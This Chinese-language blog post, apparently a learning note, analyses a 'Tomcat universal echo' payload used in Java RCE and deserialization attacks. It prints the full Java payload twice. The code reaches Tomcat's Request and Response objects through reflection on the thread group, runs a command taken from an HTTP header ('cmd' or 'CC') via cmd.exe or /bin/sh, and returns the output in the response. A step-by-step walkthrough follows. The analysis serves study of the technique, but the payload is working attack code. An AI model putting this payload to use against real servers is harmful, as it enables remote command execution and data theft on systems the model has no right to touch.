# Tomcat通用回显学习笔记

##  前言

RCE回显技术在20年突然火爆全网，这里学习跟进一下。看了很多大佬分析技术文章和实现方法可谓是百花齐放，但情有独钟的一种方法是来着**zema1/ysoserial**里面中的回显技术。Tomcat全版本都能实现回显，和其他大佬的方式不一样点是直接中`Thread`入手。但目前没看到对此方法的分析，这里斗胆写下自己的一些看法，如有错误还请斧正。

 所以的源码、环境都已经上传至https://github.com/SummerSec/JavaLearnVulnerability

---

## 回显代码赏析

先贴出代码，大致上分析一下代码。代码来着https://github.com/feihong-cs/Java-Rce-Echo，代码本质上是和**zema1/ysoserial**的一样，只是换个方法。不难看出代码用了大量的反射，异常处理面对不同版本Tomcat可能出现的情况，与if语句不同，异常处理更加直接点，直接尝试两种方法面对不同情况。

```java
	boolean flag = false;
    ThreadGroup group = Thread.currentThread().getThreadGroup();
    java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
    f.setAccessible(true);
    Thread[] threads = (Thread[]) f.get(group);
    for(int i = 0; i < threads.length; i++) {
        try{
            Thread t = threads[i];
            if (t == null) continue;
            String str = t.getName();
            if (str.contains("exec") || !str.contains("http")) continue;
            f = t.getClass().getDeclaredField("target");
            f.setAccessible(true);
            Object obj = f.get(t);
            if (!(obj instanceof Runnable)) continue;
            f = obj.getClass().getDeclaredField("this$0");
            f.setAccessible(true);
            obj = f.get(obj);
            try{
                f = obj.getClass().getDeclaredField("handler");
            }catch (NoSuchFieldException e){
                f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
            }
            f.setAccessible(true);
            obj = f.get(obj);
            try{
                f = obj.getClass().getSuperclass().getDeclaredField("global");
            }catch(NoSuchFieldException e){
                f = obj.getClass().getDeclaredField("global");
            }
            f.setAccessible(true);
            obj = f.get(obj);
            f = obj.getClass().getDeclaredField("processors");
            f.setAccessible(true);
            java.util.List processors = (java.util.List)(f.get(obj));
            for(int j = 0; j < processors.size(); ++j) {
                Object processor = processors.get(j);
                f = processor.getClass().getDeclaredField("req");
                f.setAccessible(true);
                Object req = f.get(processor);
                Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                if (str != null && !str.isEmpty()) {
                    resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                    byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                    try {
                        Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                        obj = cls.newInstance();
                        cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                        resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                    } catch (NoSuchMethodException var5) {
                        Class cls = Class.forName("java.nio.ByteBuffer");
                        obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                        resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                    }
                    flag = true;
                }
                if (flag) break;
            }
            if (flag)  break;
        }catch(Exception e){
            continue;
        }
    }
```

----

### Thread

1、每个Java应用程序都有一个执行Main()函数的默认主线程。**这个就是主线程**
2、应用程序也可以创建线程在后台运行。Java主要是通过Java.Lang.Thread类以及Java.lang.Runnable接口来实现线程机制的。**这边所有的都是其余线程**

在Java的反射中，get方法是可以获取该字段对应的对象，但有一定的条件。ps：在文末补充知识点补充

```
 		// 获取当前线程组
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        // 反射获取字段threads
        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        // f.get(group) 获取 threads 线程中数组对象
        Thread[] threads = (Thread[]) f.get(group);
```

开启一个spring boot 服务，debug看一下流程。

![image-20210621171304714](https://img.sumsec.me/summersec//4u13er4ec/4u13er4ec.png)

![image-20210621171707685](https://img.sumsec.me/summersec//7u17er7ec/7u17er7ec.png)

对流程处理分析，这里引用lucifaer师傅的一张图。

![image-20210712172325083](https://img.sumsec.me/summersec//25u23er25ec/25u23er25ec.png)





---

###  线程处理

获取线程名字，跳过不需要的线程。

```
String str = t.getName();
//http-nio-8090-BlockPoller continue  NoSuchField异常 i=3
if (str.contains("exec") || !str.contains("http")) {
    continue;
}
```

**如何确定那些线程是需要的呢？**

（1）http-nio-8080-Acceptor为请求接收器，其只接收请求，不会对请求做任务业务处理操作，所以默认为单个线程。

（2）http-nio-8080-ClientPoller-0和http-nio-8080-ClientPoller-1为两个是作为轮询器或者转发器使用的，简单来说就是对获取到的SocketWrapper添加到一个线程池中进行处理，这种类型的线程数与CPU的核数有关。

（3）http-nio-8080-exec-1到10是tomcat的一个线程池产生的默认的10线程，这10个线程是用来执行具体的servlet请求操作，线程的数目可以跟随请求说的变化而变化。

以上3种类型的线程有点类似Reactor模式。Tomcat通过Connector中的Acceptor绑定8080端口并接收请求，然后通过Poller,Worker转交给`Http11Processor`解析出请求。ps: 8080均是指定端口


![img](https://img-blog.csdnimg.cn/img_convert/c4db77c44e5984a528fa03283e823879.png)



![img](https://img-blog.csdnimg.cn/img_convert/9b50945b295fd5d34f90b69e9212ee24.png)



结合上面两张图和lucifaer大佬在文章[Tomcat通用回显学习](https://lucifaer.com/2020/05/12/Tomcat通用回显学习/)中所提交Processor对象，确定所需要的线程是`http-nio-xxxx-ClientPoller`。

利用IDEA功能导出线程栈部分数据如下，数据太多完整版上传GitHub中。不难分析这里出现了`Poller`对象，有`Poller`就会有`Processor`对象。

```
"http-nio-8090-ClientPoller@5462" daemon prio=5 tid=0x2d nid=NA runnable
  java.lang.Thread.State: RUNNABLE
	  at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(WindowsSelectorImpl.java:-1)
	  at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296)
	  at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278)
	  at sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159)
	  at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)
	  - locked <0x1682> (a sun.nio.ch.WindowsSelectorImpl)
	  - locked <0x168a> (a java.util.Collections$UnmodifiableSet)
	  - locked <0x168b> (a sun.nio.ch.Util$2)
	  at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)
	  at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:816)
	  at java.lang.Thread.run(Thread.java:745)
```



----

### 获取Processor对象

1. 进入线程`ClientPoller`之后，T基本类型变成了java.lang.Thread。反射获取其中`target`字段，该字段的类型是`Runnable`。

```java
//str = http-nio-8090-ClientPoller 进入下面 ps: i=14
// java.lang.Thread
f = t.getClass().getDeclaredField("target");
f.setAccessible(true);
// obj ->  NioEndpoint$Poller实例化对象
Object obj = f.get(t);
// NioEndpoint$Poller  implements Runnable
if (!(obj instanceof Runnable)) {
continue;
}

```

![image-20210622072408669](https://img.sumsec.me/summersec//8u24er8ec/8u24er8ec.png)

2. `NioEndpoint$Poller`是实现了Runnable接口

![image-20210622073817914](https://img.sumsec.me/summersec//18u38er18ec/18u38er18ec.png)

3. 这里是一个匿名内部类（NioEndpoint$Poller）获取持有的外部类对象（NioEndpoint）的操作，参考补充小知识this$0。

```
// this$0 是NioEndpoint对象
f = obj.getClass().getDeclaredField("this$0");
f.setAccessible(true);
```

4. 获取到NioEndpoint对象之后，向上获取Handler对象。 NioEndpoint extends AbstractJsseEndpoint<NioChannel, SocketChannel>然而在AbstractJsseEndpoint中是没有Handler字段对象的， 但在其extends  `AbstractEndpoint`中是存在AbstractEndpoint$Handler字段。

    

```
// f.get(obj) --> org.apche.tomcat.util.net.NioEndpoint 对象
obj = f.get(obj);
// NioEndpoint extends AbstractJsseEndpoint<NioChannel, SocketChannel> --> extends AbstractEndpoint$Handler
//  AbstractEndpoint$Handler 是一个接口，在org.apche.coyote.AbstractProtocol$ConnectionsHanhler实现
try {
f = obj.getClass().getDeclaredField("handler");
} catch (NoSuchFieldException e) {
f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
}
// obj -->  org.apche.coyote.AbstractProtocol$ConnectionsHanhler
f.setAccessible(true);
obj = f.get(obj);
```

![image-20210622075444742](https://img.sumsec.me/summersec//9u55er9ec/9u55er9ec.png)

5. 在AbstractEndpoint$Handler是一个接口，其实现类`AbstractProtocol$ConnectionsHanhler`是所需要的Handler。ConnectionsHanhler中是包含`global`字段。

```java
// obj --> org.apche.coyote.AbstractProtocol$ConnectionsHanhler
try {
f = obj.getClass().getSuperclass().getDeclaredField("global");
} catch (NoSuchFieldException e) {
// obj --> AbstractProtocol$ConnectionsHanhler
f = obj.getClass().getDeclaredField("global");
}
```

![image-20210622080307404](https://img.sumsec.me/summersec//7u03er7ec/7u03er7ec.png)

6. 获取到`RequestGroupInfo`对象，在`RequestGroupInfo`之中有包含`Processor`对象`list`。

```
// obj --> org.apche.coyote.RequestGroupInfo
f.setAccessible(true);
obj = f.get(obj);
f = obj.getClass().getDeclaredField("processors");
f.setAccessible(true);
// processors --> List<RequestInfo>
java.util.List processors = (java.util.List) (f.get(obj));
```

![image-20210622080509210](https://img.sumsec.me/summersec//9u05er9ec/9u05er9ec.png)

7. 获取到Processor对象之后，接着获取`Request`和`Response`，在然后就是一段读写操作。

```
				 // processors.size() == 1
                for (int j = 0; j < processors.size(); ++j) {
                    Object processor = processors.get(j);
                    f = processor.getClass().getDeclaredField("req");
                    f.setAccessible(true);
                    // org.apche.coyote.Request
                    Object req = f.get(processor);
                    // org.apche.coyote.Response
                    Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                    // header cc: "cmd"
                    str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"CC"});
                    if (str != null && !str.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);
                        try {
                            Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                            obj = cls.newInstance();
                            cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                        } catch (NoSuchMethodException var5) {
                            Class cls = Class.forName("java.nio.ByteBuffer");
                            obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                        }
                        flag = true;
                    }
```



----

## 总结

本篇文章从Thread角度出发，分析如何一步步获取`Processor`对象，再到`RequestGruopInfo`对象，最后获取`Response`并写入回显结果。本文并没有过多分析为什么要获取这些对象，这些内容在其他大佬的文章均有写到。这里推荐我看的时间最久文章[Tomcat通用回显](https://lucifaer.com/2020/05/12/Tomcat通用回显学习/)。 

![Tomcat](https://img.sumsec.me/summersec//0u46er0ec/0u46er0ec.png)





---

## 补充小知识

###  Field.get()

>返回这个字段在指定对象上所代表的字段的值。如果该值有一个原始类型，它将被自动包装在一个对象中。
>底层字段的值是按如下方式获得的。
>如果底层字段是一个静态字段，obj参数被忽略；它可能是空的。
>否则，底层字段是一个实例字段。如果指定的obj参数为空，该方法会抛出一个NullPointerException。如果指定的对象不是声明底层字段的类或接口的实例，该方法会抛出一个IllegalArgumentException。
>如果这个字段对象正在执行Java语言的访问控制，并且底层字段是不可访问的，该方法会抛出一个IllegalAccessException。如果底层字段是静态的，声明该字段的类将被初始化，如果它还没有被初始化。
>否则，该值将从底层实例或静态字段中检索出来。如果字段有一个原始类型，那么在返回之前，该值会被包裹在一个对象中，否则会原样返回。
>如果字段被隐藏在obj的类型中，那么字段的值将根据前面的规则获得。

大致作用就是返回该字段的实例对象，如果字段不是类和接口的实例就会报错。



----



### this$0

this$0是指获取匿名内部类持有的外部类对象，大致意思如下，`ThirdInner`的外部this$0类对象是`Outer`。更多内容可以参考[获取Java匿名内部类持有的外部类对象](https://www.jianshu.com/p/9335c15c43cf)。

```
public class Outer {//this$0

    public class FirstInner {//this$1

        public class SecondInner {//this$2

            public class ThirdInner {
            }
        }
    }
}
```





----

## 参考

https://zhuanlan.zhihu.com/p/85448047

https://blog.csdn.net/qq924862077/article/details/79617621

https://lucifaer.com/2020/05/12/Tomcat通用回显学习/

https://lgtm.com/query/1252408723639078309/

